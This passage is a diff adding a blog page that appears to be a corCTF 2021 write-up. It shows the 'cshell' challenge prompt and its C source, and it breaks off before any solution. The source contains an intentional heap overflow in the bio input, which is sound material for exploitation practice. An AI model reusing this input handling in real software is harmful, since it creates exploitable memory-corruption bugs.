@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>cshell</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/cshell/#cshell-c">Cshell.c</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>cshell</h1>
+    </header>
+
+    <div class="content">
+        <pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>My friend Hevr thinks I can&#39;t code, so I decided to prove him wrong by making a restricted shell in which he is unable to play squad. I must add that my programming skills are very cache money...
+</span><span>nc pwn.be.ax 5001
+</span></code></pre>
+<p>We're provided a binary and source.</p>
+<h3 id="cshell-c">Cshell.c</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;string.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;unistd.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;crypt.h&gt;
+</span><span style="font-style:italic;color:#5c6773;">//gcc Cshell.c -static -lcrypt -o Cshell
+</span><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">users </span><span>{
+</span><span>	</span><span style="color:#ffa759;">char</span><span> name[</span><span style="color:#ffcc66;">8</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> passwd[</span><span style="color:#ffcc66;">35</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">tracker</span><span>{
+</span><span>	</span><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">tracker</span><span> *next</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">users</span><span> *ptr</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> name[</span><span style="color:#ffcc66;">8</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">long int</span><span> id</span><span style="color:#ccc9c2cc;">;
+</span><span>}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span> alex_buff</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span> Charlie_buff</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span> Johnny_buff</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span> Eric_buff</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct</span><span> users </span><span style="color:#f29e74;">*</span><span>user</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct</span><span> users </span><span style="color:#f29e74;">*</span><span>root</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct</span><span> tracker </span><span style="color:#f29e74;">*</span><span>root_t</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct</span><span> tracker </span><span style="color:#f29e74;">*</span><span>user_t</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>username[</span><span style="color:#ffcc66;">8</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>userbuffer</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">int</span><span> uid</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">1000</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">int</span><span> length</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char</span><span> salt[</span><span style="color:#ffcc66;">5</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;1337</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>hash</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">setup</span><span>(){
+</span><span>	</span><span style="color:#ffa759;">char</span><span> password_L[</span><span style="color:#ffcc66;">33</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Welcome to Cshell, a very restricted shell.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Please create a profile.&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Enter a username up to 8 characters long.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%8s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Welcome to the system </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">, you are our 3rd user. We used to have more but some have deleted their accounts.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Create a password.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%32s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>password_L)</span><span style="color:#ccc9c2cc;">;
+</span><span>	hash </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">crypt</span><span>(password_L</span><span style="color:#ccc9c2cc;">,</span><span>salt)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;How many characters will your bio be (200 max)?</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%d</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>length)</span><span style="color:#ccc9c2cc;">;
+</span><span>	userbuffer </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(length </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Great, please type your bio.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">getchar</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">fgets</span><span>((userbuffer </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">201</span><span style="color:#ccc9c2cc;">,</span><span>stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">logout</span><span>(){
+</span><span>	</span><span style="color:#f28779;">fflush</span><span>(stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">getchar</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">struct</span><span> tracker </span><span style="color:#f29e74;">*</span><span>ptr</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Username:&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> username_l[</span><span style="color:#ffcc66;">9</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> password_l[</span><span style="color:#ffcc66;">32</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>hash</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%8s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>username_l)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">for </span><span>(ptr </span><span style="color:#f29e74;">=</span><span> root_t</span><span style="color:#ccc9c2cc;">;</span><span> ptr </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">;</span><span> ptr </span><span style="color:#f29e74;">=</span><span> root_t</span><span style="color:#f29e74;">-&gt;</span><span>next) {
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f28779;">strcmp</span><span>(ptr</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span> username_l) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Password:&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	    </span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%32s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>password_l)</span><span style="color:#ccc9c2cc;">;
+</span><span>	    hash </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">crypt</span><span>(password_l</span><span style="color:#ccc9c2cc;">,</span><span>salt)</span><span style="color:#ccc9c2cc;">;
+</span><span>	    </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f28779;">strcmp</span><span>(hash</span><span style="color:#ccc9c2cc;">,</span><span>ptr</span><span style="color:#f29e74;">-&gt;</span><span>ptr</span><span style="color:#f29e74;">-&gt;</span><span>passwd) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>){
+</span><span>		    </span><span style="color:#f28779;">strcpy</span><span>(username</span><span style="color:#ccc9c2cc;">,</span><span>ptr</span><span style="color:#f29e74;">-&gt;</span><span>name)</span><span style="color:#ccc9c2cc;">;
+</span><span>		    uid </span><span style="color:#f29e74;">=</span><span> ptr</span><span style="color:#f29e74;">-&gt;</span><span>id</span><span style="color:#ccc9c2cc;">;
+</span><span>		    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Authenticated!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		    </span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	    }
+</span><span>	    </span><span style="color:#ffa759;">else</span><span>{
+</span><span>		    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Incorrect&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		    </span><span style="color:#ffd580;">logout</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	    }
+</span><span>			 
+</span><span>        }
+</span><span>	</span><span style="color:#ffa759;">else
+</span><span>	{
+</span><span>		</span><span style="color:#ffa759;">if </span><span>(ptr</span><span style="color:#f29e74;">-&gt;</span><span>next</span><span style="color:#f29e74;">==</span><span style="color:#ffcc66;">0</span><span>)
+</span><span>		{
+</span><span>			</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Sorry no users with that name.&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>			</span><span style="color:#ffd580;">logout</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>	}
+</span><span>    }
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">whoami</span><span>(){
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">, uid: </span><span style="color:#ffcc66;">%d</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>username</span><span style="color:#ccc9c2cc;">,</span><span>uid)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">bash</span><span>(){
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(uid </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>){
+</span><span>		</span><span style="color:#f28779;">system</span><span>(</span><span style="color:#bae67e;">&quot;bash&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>	</span><span style="color:#ffa759;">else 
+</span><span>	{
+</span><span>		</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Who do you think you are?&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">squad</span><span>(){
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;..&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">banner</span><span>(){
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;       /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;      {.-}&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;     ;_.-&#39;</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;    {    _.}_&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">.-&#39; /  `,&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  |    /&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;      </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> |  ,/&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;       </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">|_/&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">menu</span><span>(){
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;+----------------------+&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;|        Commands      |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;+----------------------+&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 1. logout            |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 2. whoami            |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 3. bash (ROOT ONLY!) |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 4. squad             |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 5. exit              |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;+----------------------+&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">int</span><span> option</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Choice &gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%i</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>option)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">switch</span><span>(option){
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#ffd580;">logout</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#ffd580;">whoami</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#ffd580;">bash</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#ffd580;">squad</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">default</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;[!] invalid choice </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>			</span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">history</span><span>(){
+</span><span>	alex_buff </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">0x40</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> alex_data[</span><span style="color:#ffcc66;">0x40</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Alex</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Just a user on this system.</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> Johnny[</span><span style="color:#ffcc66;">0x50</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Johnny</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;"> Not sure why I am a user on this system.</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> Charlie[</span><span style="color:#ffcc66;">0x50</span><span>] </span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;Charlie</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">I do not trust the security of this program...</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> Eric[</span><span style="color:#ffcc66;">0x60</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Eric</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">This is one of the best programs I have ever used!</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(alex_buff</span><span style="color:#ccc9c2cc;">,</span><span>alex_data)</span><span style="color:#ccc9c2cc;">;
+</span><span>	Charlie_buff </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">0x50</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(Charlie_buff</span><span style="color:#ccc9c2cc;">,</span><span>Charlie)</span><span style="color:#ccc9c2cc;">;
+</span><span>	Johnny_buff </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">0x60</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(Johnny_buff</span><span style="color:#ccc9c2cc;">,</span><span>Johnny)</span><span style="color:#ccc9c2cc;">;
+</span><span>	Eric_buff </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">0x80</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(Eric_buff</span><span style="color:#ccc9c2cc;">,</span><span>Eric)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">free</span><span>(Charlie_buff)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">free</span><span>(Eric_buff)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span>(){
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0 </span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2 </span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdin</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0 </span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2 </span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	root_t </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffa759;">sizeof</span><span>(</span><span style="color:#ffa759;">struct</span><span> tracker))</span><span style="color:#ccc9c2cc;">;
+</span><span>	user_t </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffa759;">sizeof</span><span>(</span><span style="color:#ffa759;">struct</span><span> tracker))</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">history</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">banner</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	user </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffa759;">sizeof</span><span>(</span><span style="color:#ffa759;">struct</span><span> users )</span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	root </span><span style="color:#f29e74;">=</span><span> user </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;tempname&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user</span><span style="color:#f29e74;">-&gt;</span><span>passwd</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;placeholder&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(root</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;root&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(root</span><span style="color:#f29e74;">-&gt;</span><span>passwd</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;guessme:)&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(root_t</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;root&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	root_t</span><span style="color:#f29e74;">-&gt;</span><span>ptr </span><span style="color:#f29e74;">=</span><span> root</span><span style="color:#ccc9c2cc;">;
+</span><span>	root_t</span><span style="color:#f29e74;">-&gt;</span><span>id </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
